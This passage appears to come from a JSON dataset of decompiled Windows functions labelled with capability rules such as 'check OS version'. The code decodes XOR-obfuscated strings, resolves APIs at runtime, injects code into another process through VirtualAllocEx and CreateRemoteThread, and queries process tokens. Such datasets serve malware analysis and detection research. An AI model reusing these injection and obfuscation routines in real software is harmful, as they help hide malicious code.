fcn.0040eb1d(iVar4);\n        if (*0x41cab8 == 0) {\n            uVar3 = (*pcVar6)(0, iVar4);\n            pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*pcVar6)(0, iVar9);\n            (*pcVar2)(uVar3);\n            goto code_r0x00402268;\n        }\n        var_4ch = 0x723e531c;\n        var_48h = 0x3e672452;\n        var_44h = 0x5335545a;\n        var_40h = 0x11524739;\n        var_3ch = 0x52472853;\n        var_38h._0_2_ = 0x4423;\n        var_38h._2_1_ = 0x4c;\n        var_24h = 0x354c3750;\n        var_20h._0_1_ = 0x37;\n        uVar3 = (*pcVar6)(8, 0x18);\n        var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar9 = var_ch;\n        iVar4 = 0;\n        do {\n            puVar1 = iVar4 + var_14h;\n            iVar7 = iVar4 % var_8h;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_24h + iVar7) ^ puVar1[&var_4ch - var_14h];\n        } while (iVar4 < 0x17);\n        *0x41cac0 = fcn.0040eb1d(var_14h);\n        iVar4 = var_18h;\n        if (*0x41cac0 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        }\n        else {\n            var_4ch = 0x3322336e;\n            var_48h = 0x1121402d;\n            var_44h = 0x365d1435;\n            var_40h = 0x58233406;\n            var_3ch = 0x2d2c1709;\n            var_38h._0_2_ = 0x3d46;\n            var_38h._2_1_ = 0x72;\n            var_30h = 0x41724434;\n            var_2ch._0_2_ = CONCAT11(var_2ch._1_1_, 0x42);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n            var_1ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar9 = var_ch;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_1ch;\n                iVar7 = iVar4 % var_8h;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_30h + iVar7) ^ puVar1[&var_4ch - var_1ch];\n            } while (iVar4 < 0x17);\n            *0x41cac8 = fcn.0040eb1d(var_1ch);\n            iVar4 = var_18h;\n            if (*0x41cac8 != 0) {\n                var_4h = 0;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_1ch);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n                (*pcVar6)(uVar3);\n                pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*pcVar6)(uVar3);\n                uVar3 = (*pcVar2)(0, iVar9);\n                (*pcVar6)(uVar3);\n                goto code_r0x0040225b;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        }\n        (*pcVar6)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar6)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar9);\n        (*pcVar6)(uVar3);\n    }\n    else {\ncode_r0x0040225b:\n        puVar8 = 0x41cab8;\n        for (iVar9 = 0x18; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *var_28h = *puVar8;\n            puVar8 = puVar8 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x00402268:\n    *0x41cacc = *0x41cac8 >> 0x20;\n    *0x41cac4 = *0x41cac0 >> 0x20;\n    *0x41cabc = *0x41cab8 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2150
    },
    "00402439": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00402439(int32_t *arg_8h, int32_t arg_ch, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint *puVar7;\n    code *pcVar8;\n    int16_t *piVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t unaff_EBX;\n    int32_t iVar12;\n    uint unaff_ESI;\n    int32_t *piVar13;\n    int64_t iVar14;\n    uint uVar15;\n    int32_t iVar16;\n    int32_t *piStack152;\n    uchar *puStack148;\n    int32_t *piStack144;\n    int32_t iStack140;\n    uint uStack124;\n    uint uStack120;\n    uchar *puStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    int32_t iStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    int16_t *piStack76;\n    int32_t iStack72;\n    uint uStack68;\n    ushort uStack64;\n    uint uStack62;\n    uchar uStack58;\n    uchar uStack57;\n    uint8_t auStack56 [2];\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    ushort uStack36;\n    uint uStack34;\n    ushort uStack30;\n    uchar uStack28;\n    ushort uStack27;\n    uchar uStack25;\n    \n    iStack140 = 0x40244b;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack120 = uVar4 & 0xff;\n    piVar13 = arg_8h + 1;\n    uStack112 = piVar13;\n    if (*piVar13 != 0) {\n        iStack140 = *piVar13;\n        piStack144 = 0x40246a;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar13 = 0;\n    }\n    if (((arg_14h & 0x10) != 0) || ((*0x41cadc & 1) == 0)) {\n        iStack140 = 0x20;\n        piStack144 = 0x3000;\n        puStack148 = 0x5;\n        piStack152 = NULL;\n        iVar5 = *arg_8h;\n        puStack108 = NULL;\n        iVar12 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)();\n        pcVar8 = _sym.imp.KERNEL32.dll_VirtualProtectEx;\n        if (iVar12 != 0) {\n            uVar6 = 0x40;\n            (*_sym.imp.KERNEL32.dll_VirtualProtectEx)(*arg_8h, iVar12, 5, 0x40, &stack0xffffff80);\n            fcn.00402cf0(iVar5);\n            fcn.00402caf(&stack0xffffff70);\n            arg_ch = iVar12;\n            (*pcVar8)(*arg_8h, uVar6, 5, 0x20, &stack0xffffff64);\n        }\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iStack140 == 5) {\n            uVar6 = 0;\n            iVar5 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, arg_ch, lpParameter, 0, arg_8h + 3);\n            arg_8h[1] = iVar5;\n            if (iVar5 == 0) {\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            else {\n                iStack140 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar5, 30000);\n                if (iStack140 == 0) {\n                    (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(arg_8h[1], &stack0xffffff74);\n                }\n            }\n        }\n        else {\n            uStack96 = 0x141c065d;\n            uStack92 = 0x14161d5b;\n            uStack88 = CONCAT22(uStack88._2_2_, 0x3714);\n            puStack116 = 0x78787233;\n            uStack112 = CONCAT31(uStack112._1_3_, 0x37);\n            puVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n            uStack120 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            piStack152 = NULL;\n            puStack116 = &stack0xffffff94 + -uStack120;\n            do {\n                *(piStack152 + uStack120) =\n                     (&stack0xffffff80)[piStack152 % 5] ^ (piStack152 + uStack120)[&stack0xffffff94 + -uStack120];\n                piStack152 = piStack152 + 1;\n            } while (piStack152 < 10);\n            uVar15 = 0x15;\n            uStack64 = 0x3702;\n            uStack62 = 0x57111005;\n            uStack58 = 0x31;\n            uStack57 = 0x37;\n            auStack56[0] = 0xc;\n            auStack56[1] = 6;\n            uStack54 = 0x5710;\n            uStack52 = 0x1722;\n            uStack50 = 0x2101;\n            uStack48 = 0x43345306;\n            puStack108 = 0x53694350;\n            uStack104 = CONCAT22(uStack104._2_2_, 0x3263);\n            uVar6 = (*pcVar8)(8, 0x15);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar12 = 0;\n            do {\n                puVar1 = iVar12 + iVar5;\n                iVar10 = iVar12 % 6;\n                iVar12 = iVar12 + 1;\n                *puVar1 = (&stack0xffffff88)[iVar10] ^ puVar1[&stack0xffffffb4 + -iVar5];\n            } while (iVar12 < 0x14);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(unaff_ESI, iVar5);\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar6);\n            if (pcVar8 == NULL) {\n                uVar6 = 0xffffffff;\n            }\n            else {\n                iVar12 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, uVar15, lpParameter, puVar7, &stack0xffffff88);\n                if (iVar12 < 0) {\n                    uVar6 = fcn.0040155d();\n                }\n                else {\n                    iStack140 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar7, 30000);\n                    if (iStack140 == 0) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar7, &stack0xffffff74);\n                    }\n                    uVar6 = 0;\n                }\n            }\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, unaff_ESI);\n            (*pcVar8)(uVar15);\n        }\n        goto code_r0x00402a35;\n    }\n    uStack104 = 5;\n    if (uStack120 == 0x5) {\n        if ((*0x41cdd8 | *0x41cddc) == 0) {\n            iStack140 = 0x4024b1;\n            fcn.0040f618();\n            iStack140 = 0xb;\n            piStack144 = 0x8;\n            puStack116 = 0x6;\n            uStack64 = 0x65d;\n            uStack62 = 0x1d5b141c;\n            uStack58 = 0x16;\n            uStack57 = 0x14;\n            auStack56[0] = 0x14;\n            auStack56[1] = 0x37;\n            uStack84 = 0x78787233;\n            uStack80 = CONCAT31(uStack80._1_3_, 0x37);\n            puStack148 = 0x4024e8;\n            puStack148 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            piStack152 = 0x4024ef;\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar12 = 0;\n            piStack152 = 0x5;\n            uStack120 = &stack0xffffffb4 + -iVar5;\n            do {\n                puVar1 = iVar12 + iVar5;\n                iVar10 = iVar12 % 5;\n                iVar12 = iVar12 + 1;\n                *puVar1 = (&stack0xffffffa0)[iVar10] ^ puVar1[&stack0xffffffb4 + -iVar5];\n            } while (iVar12 < 10);\n            piStack152 = 0xc;\n            iVar16 = 8;\n            piStack76 = 0x1d280b23;\n            iStack72 = 0x1e0b0e24;\n            uStack68 = CONCAT13(uStack68._3_1_, 0x6f273d);\n            uStack96 = 0x515a6f6f;\n            uStack92 = CONCAT31(uStack92._1_3_, 0x4b);\n            uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n            iVar5 = piStack144;\n            iVar10 = 0;\n            uStack120 = &stack0xffffffa8 + -iVar12;\n            do {\n                puVar1 = iVar10 + iVar12;\n                iVar11 = iVar10 % unaff_EBX;\n                iVar10 = iVar10 + 1;\n                *puVar1 = (&stack0xffffff94)[iVar11] ^ *(&stack0xffffffa8 + -iVar12 + puVar1);\n            } while (iVar10 < 0xb);\n            iVar14 = fcn.0040eb1d(iVar12);\n            uStack112 = iVar14;\n            if (iVar14 == 0) {\n                uVar6 = 0xffffffff;\n            }\n            else {\n                uVar15 = 8;\n                auStack56[0] = 0x11;\n                auStack56[1] = 0x57;\n                uStack54 = 0x6b15;\n                uStack52 = 0x4923;\n                uStack50 = 0x5714;\n                uStack48 = 0x493d6b15;\n                uStack44 = 0x6b115718;\n                uStack40 = 0x571f4922;\n                uStack36 = 0x6b70;\n                iStack100 = 0x6b70577a;\n                uStack96 = CONCAT22(uStack96._2_2_, 0x4951);\n                uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                iVar5 = iVar16;\n                piStack76 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                iVar12 = piStack144;\n                iVar10 = 0;\n                uStack120 = piStack76;\n                do {\n                    puVar1 = iVar10 + piStack76;\n                    iVar16 = iVar10 % piStack152;\n                    iVar10 = iVar10 + 1;\n                    *puVar1 = (&stack0xffffff90)[iVar16] ^ puVar1[&stack0xffffffbc + -piStack76];\n                } while (iVar10 < 0x16);\n                iStack72 = piStack76 >> 0x1f;\n                piVar9 = piStack76;\n                do {\n                    iVar2 = *piVar9;\n                    piVar9 = piVar9 + 1;\n                } while (iVar2 != 0);\n                uStack80 = 0;\n                iVar2 = (piVar9 - (piStack76 + 1) >> 1) * 2;\n                uStack84 = CONCAT22(iVar2 + 2, iVar2);\n                iVar10 = iVar5;\n                iVar16 = fcn.0040f9a0(uStack124, iStack140, 4, 0, 0, 0, 0, 0, &stack0xffffffac, &stack0xffffffac >> 0x1f\n                                      , &stack0xffffff9c, &stack0xffffff9c >> 0x1f, uVar6, uVar15);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                if (iVar16 < 0) {\n                    uVar6 = fcn.0040155d();\n                }\n                else {\n                    uStack112 = 0x2b175623;\n                    puStack108 = 0x4512453;\n                    uStack104 = uStack104 & 0xff000000 | 0x485336;\n                    iStack140 = 0x45653348;\n                    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                    piStack144 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                    iVar5 = 0;\n                    do {\n                        *(iVar5 + piStack144) =\n                             (&stack0xffffff68)[iVar5 % 5] ^ (iVar5 + piStack144)[&stack0xffffff84 + -piStack144];\n                        iVar5 = iVar5 + 1;\n                    } while (iVar5 < 0xb);\n                    uStack80 = 0x551c1e0d;\n                    piStack76 = 0x91c3f3b;\n                    iStack72 = 0x3f3b5b14;\n                    uStack68 = 0x510b041a;\n                    uStack64 = 0x3e2e;\n                    uStack62 = CONCAT31(uStack62._1_3_, 0x4e);\n                    uStack124 = 0x34796c4e;\n                    uStack120 = CONCAT22(uStack120._2_2_, 0x5a4f);\n                    uVar6 = (*pcVar8)(8, 0x14);\n                    iVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n                    iVar5 = 0;\n                    puStack148 = &stack0xffffffa4 + -iVar12;\n                    do {\n                        puVar1 = iVar5 + iVar12;\n                        iVar16 = iVar5 % 6;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = (&stack0xffffff78)[iVar16] ^ puVar1[&stack0xffffffa4 + -iVar12];\n                    } while (iVar5 < 0x13);\n                    uVar6 = 0xffffffff;\n                    iVar5 = iVar10;\n                    *0x41cdd8 = fcn.0040eb1d(iVar12);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                    uVar15 = (*pcVar8)(0, iVar10);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n                    iVar12 = piStack144;\n                }\n                uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uStack120);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar15 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            uVar15 = (*pcVar8)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar15);\n            piVar13 = uStack112;\n            *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n            if (*0x41cdd8 == 0) goto code_r0x00402a35;\n        }\n        else {\n            uVar6 = 0xffffffff;\n        }\n        *0x41cddc = *0x41cdd8 >> 0x20;\n        piStack144 = arg_8h + 3;\n        iStack140 = piStack144 >> 0x1f;\n        puStack148 = NULL;\n        piStack152 = NULL;\n        iVar5 = fcn.0040f9a0(*0x41cdd8, *0x41cddc, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, arg_ch, arg_ch >> 0x1f, \n                             lpParameter, lpParameter >> 0x1f);\n        *piVar13 = iVar5;\n        *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n        if (iVar5 != 0) {\n            uVar6 = 0;\n            *0x41cde0 = CONCAT44(*0x41cde4, *0x41cde0);\n        }\n        goto code_r0x00402a35;\n    }\n    piStack152 = piVar13;\n    if ((*0x41cde0 | *0x41cde4) == 0) {\n        iStack140 = 0xb;\n        piStack144 = 0x8;\n        puStack116 = 0x6;\n        uStack64 = 0x65d;\n        uStack62 = 0x1d5b141c;\n        uStack58 = 0x16;\n        uStack57 = 0x14;\n        auStack56[0] = 0x14;\n        auStack56[1] = 0x37;\n        uStack96 = 0x78787233;\n        uStack92 = CONCAT31(uStack92._1_3_, 0x37);\n        puStack148 = 0x4028c9;\n        puStack148 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        piStack152 = 0x4028d0;\n        iStack100 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n        uStack120 = NULL;\n        piStack152 = 0x5;\n        uStack96 = &stack0xffffffb4 + -iStack100;\n        do {\n            *(uStack120 + iStack100) =\n                 (&stack0xffffff94)[uStack120 % 5] ^ (uStack120 + iStack100)[&stack0xffffffb4 + -iStack100];\n            uStack120 = uStack120 + 1;\n        } while (uStack120 < 10);\n        piStack152 = 0x15;\n        uStack44 = 0x10053702;\n        uStack40 = 0x37315711;\n        uStack28 = 6;\n        uStack36 = 0x60c;\n        uStack34 = 0x17225710;\n        uStack30 = 0x2101;\n        uStack27 = 0x3453;\n        uStack25 = 0x43;\n        uStack88 = 0x53694350;\n        uStack84 = CONCAT22(uStack84._2_2_, 0x3263);\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar6);\n        iVar12 = 0;\n        puStack108 = &stack0xffffffc8 + -iVar5;\n        do {\n            puVar1 = iVar12 + iVar5;\n            iVar10 = iVar12 % iStack140;\n            iVar12 = iVar12 + 1;\n            *puVar1 = (&stack0xffffff9c)[iVar10] ^ puVar1[&stack0xffffffc8 + -iVar5];\n        } while (iVar12 < 0x14);\n        fcn.0040f618();\n        piVar13 = uStack112;\n        *0x41cde0 = fcn.0040eb1d(iVar5);\n        pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n        pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n        uVar6 = (*pcVar3)(0, piVar13);\n        (*pcVar8)(uVar6);\n        piStack152 = uStack112;\n        if (*0x41cde0 != 0) goto code_r0x004029ee;\n    }\n    else {\ncode_r0x004029ee:\n        *0x41cde4 = *0x41cde0 >> 0x20;\n        piStack144 = &stack0xffffffc0;\n        uVar6 = 0;\n        iStack140 = piStack144 >> 0x1f;\n        puStack148 = piStack152 >> 0x1f;\n        iVar5 = fcn.0040f9a0(*0x41cde0, *0x41cde4, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n        if (-1 < iVar5) goto code_r0x00402a35;\n    }\n    uVar6 = 0xffffffff;\ncode_r0x00402a35:\n    *0x41cde4 = *0x41cde0 >> 0x20;\n    *0x41cddc = *0x41cdd8 >> 0x20;\n    return uVar6;\n}\n",
        "token_count": 5061
    },
    "004037a0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004037a0(uint param_1, uchar *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uchar *puVar11;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    ushort var_38h;\n    uint var_36h;\n    int32_t var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    code *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint hObject;\n    uint *var_ch;\n    int32_t lpLibFileName;\n    uint dwBytes;\n    \n    puVar10 = &var_78h;\n    var_28h = param_2;\n    for (iVar5 = 0x18; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    var_48h = *0x41caec;\n    var_44h = 0;\n    dwBytes = 0;\n    var_1ch = 0;\n    var_24h = 0x6;\n    var_3ch._0_2_ = 0x65d;\n    var_3ch._2_1_ = 0x1c;\n    var_3ch._3_1_ = 0x14;\n    var_38h = 0x1d5b;\n    var_36h._0_1_ = 0x16;\n    var_36h._1_1_ = 0x14;\n    var_36h._2_1_ = 0x14;\n    var_36h._3_1_ = 0x37;\n    var_30h = 0x78787233;\n    var_2ch._0_1_ = 0x37;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    lpLibFileName = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0x5;\n    iVar5 = 0;\n    do {\n        puVar1 = iVar5 + lpLibFileName;\n        iVar6 = iVar5 % 5;\n        iVar5 = iVar5 + 1;\n        *puVar1 = *(&var_30h + iVar6) ^ puVar1[&var_3ch - lpLibFileName];\n    } while (iVar5 < 10);\n    var_40h = 0x1f0c210e;\n    var_3ch._0_2_ = 0x3a3d;\n    var_3ch._2_1_ = 6;\n    var_3ch._3_1_ = 0x31;\n    var_38h = 0x3b00;\n    var_36h._0_1_ = 0x31;\n    var_36h._1_1_ = 0x25;\n    var_36h._2_1_ = 0x30;\n    var_36h._3_1_ = 0x6f;\n    var_30h = 0x6f435654;\n    var_2ch._0_1_ = 0x58;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xf);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = lpLibFileName;\n    iVar8 = 0;\n    var_14h = iVar5;\n    do {\n        puVar1 = iVar8 + iVar5;\n        iVar7 = iVar8 % var_ch;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_30h + iVar7) ^ puVar1[&var_40h - iVar5];\n    } while (iVar8 < 0xe);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    var_78h = 0x18;\n    var_74h = 0;\n    var_6ch = 0;\n    var_70h = 0;\n    var_68h = 0;\n    var_64h = 0;\n    iVar8 = (*pcVar4)(&var_18h, 0x400, &var_78h, &var_48h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (-1 < iVar8) {\n        var_5ch = 0x6011928;\n        var_58h = 0x1c221c0b;\n        var_54h = 0x10b1521;\n        var_50h = 0x1d213a01;\n        var_4ch = var_4ch & 0xff000000 | 0x721c0b;\n        var_38h = 0x6e72;\n        var_36h._0_1_ = 0x4e;\n        var_36h._1_1_ = 0x76;\n        var_36h._2_1_ = 0x6e;\n        var_36h._3_1_ = 0x72;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n        var_30h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar6 = lpLibFileName;\n        iVar5 = 0;\n        do {\n            puVar1 = iVar5 + var_30h;\n            iVar8 = iVar5 % var_24h;\n            iVar5 = iVar5 + 1;\n            *puVar1 = *(&var_38h + iVar8) ^ puVar1[&var_5ch - var_30h];\n        } while (iVar5 < 0x13);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, var_30h);\n        pcVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        iVar5 = (*pcVar4)(var_18h, 8, &hObject);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (-1 < iVar5) {\n            var_60h = 0x38182638;\n            var_5ch = 0x28100a;\n            var_58h = 0x230d0923;\n            var_54h = 0xb1b2c24;\n            var_50h = 0x19273e;\n            var_4ch = 0x4d273409;\n            var_38h = 0x5162;\n            var_36h._0_1_ = 0x49;\n            var_36h._1_1_ = 0x4d;\n            var_36h._2_1_ = 0x6f;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n            iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = lpLibFileName;\n            iVar8 = 0;\n            var_20h = iVar5;\n            do {\n                puVar1 = iVar8 + iVar5;\n                iVar7 = iVar8 % var_ch;\n                iVar8 = iVar8 + 1;\n                *puVar1 = *(&var_38h + iVar7) ^ puVar1[&var_60h - iVar5];\n            } while (iVar8 < 0x18);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n            var_24h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            (*var_24h)(hObject, 1, 0, 0, &dwBytes);\n            pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, dwBytes);\n            var_ch = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (var_ch != NULL) {\n                iVar8 = (*var_24h)(hObject, 1, var_ch, dwBytes, &dwBytes);\n                if (-1 < iVar8) {\n                    puVar9 = *var_ch;\n                    puVar11 = var_28h;\n                    for (iVar5 = 0x1c; iVar5 != 0; iVar5 = iVar5 + -1) {\n                        *puVar11 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar11 = puVar11 + 1;\n                    }\n                    var_1ch = 1;\n                    iVar5 = var_20h;\n                    iVar6 = lpLibFileName;\n                }\n                uVar3 = (*pcVar4)(0, var_ch);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            uVar3 = (*pcVar4)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        iVar5 = var_14h;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(var_18h);\n        uVar3 = (*pcVar4)(0, var_30h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    uVar3 = (*pcVar4)(0, iVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar4)(0, iVar6);\n    (*pcVar2)(uVar3);\n    return var_1ch;\n}\n",
        "token_count": 2405
    },
    "00404803": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404803(void)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    code *pcVar14;\n    uint *puVar15;\n    int16_t *piVar16;\n    uint lpFindFileData;\n    uint lpString1;\n    uint *lpMem;\n    int32_t var_d4h;\n    int32_t var_d0h;\n    int32_t var_cch;\n    uint var_c8h;\n    int32_t lpString2;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    int32_t hFindFile;\n    int16_t *var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uchar *ARG_0;\n    uchar *lpFileName;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    